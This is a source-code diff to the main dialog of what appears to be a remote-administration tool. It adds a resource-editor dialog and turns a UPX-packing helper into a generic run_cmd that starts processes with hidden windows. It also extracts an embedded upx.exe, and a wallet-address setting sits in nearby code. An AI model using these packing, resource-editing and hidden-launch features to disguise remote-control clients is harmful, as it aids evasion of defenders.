@@ -41,6 +41,7 @@
 #include "CDrawingBoard.h"
 #include "CWalletDlg.h"
 #include <wallet.h>
+#include "CRcEditDlg.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -477,6 +478,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 	ON_NOTIFY(NM_CUSTOMDRAW, IDC_ONLINE, &CMy2015RemoteDlg::OnNMCustomdrawOnline)
 	ON_COMMAND(ID_ONLINE_RUN_AS_ADMIN, &CMy2015RemoteDlg::OnOnlineRunAsAdmin)
 	ON_COMMAND(ID_MAIN_WALLET, &CMy2015RemoteDlg::OnMainWallet)
+	ON_COMMAND(ID_TOOL_RCEDIT, &CMy2015RemoteDlg::OnToolRcedit)
 END_MESSAGE_MAP()
 
 
@@ -2656,15 +2658,12 @@ BOOL WriteBinaryToFile(const char* path, const char* data, ULONGLONG size)
 	return TRUE;
 }
 
-int run_upx(const std::string& upx, const std::string &file, bool isCompress) {
+int run_cmd(std::string cmdLine) {
 	STARTUPINFOA si = { sizeof(si) };
 	si.dwFlags |= STARTF_USESHOWWINDOW;
 	si.wShowWindow = SW_HIDE;
 
-	PROCESS_INFORMATION pi;
-	std::string cmd = isCompress ? "\" --best \"" : "\" -d \"";
-	std::string cmdLine = "\"" + upx + cmd + file + "\"";
-
+	PROCESS_INFORMATION pi = { 0 };
 	BOOL success = CreateProcessA(
 		NULL,
 		&cmdLine[0],  // 注意必须是非 const char*
@@ -2688,20 +2687,14 @@ int run_upx(const std::string& upx, const std::string &file, bool isCompress) {
 	return static_cast<int>(exitCode);
 }
 
+int run_upx(const std::string& upx, const std::string &file, bool isCompress) {
+	std::string cmd = isCompress ? "\" --best \"" : "\" -d \"";
+	std::string cmdLine = "\"" + upx + cmd + file + "\"";
+	return run_cmd(cmdLine);
+}
+
 std::string ReleaseUPX() {
-	DWORD dwSize = 0;
-	LPBYTE data = ReadResource(IDR_BINARY_UPX, dwSize);
-	if (!data)
-		return "";
-
-	char path[MAX_PATH];
-	DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
-	std::string curExe = path;
-	GET_FILEPATH(path, "upx.exe");
-	BOOL r = WriteBinaryToFile(path, (char*)data, dwSize);
-	SAFE_DELETE_ARRAY(data);
-
-	return r ? path : "";
+	return ReleaseEXE(IDR_BINARY_UPX, "upx.exe");
 }
 
 // 解压UPX对当前应用程序进行操作
@@ -3304,4 +3297,11 @@ void CMy2015RemoteDlg::OnMainWallet()
 	strcpy(m_settings.WalletAddress, dlg.m_str);
 	THIS_CFG.SetStr("settings", "wallet", m_settings.WalletAddress);
 	SendMasterSettings(nullptr);
+}
+
+
+void CMy2015RemoteDlg::OnToolRcedit()
+{
+	CRcEditDlg dlg;
+	dlg.DoModal();
 }
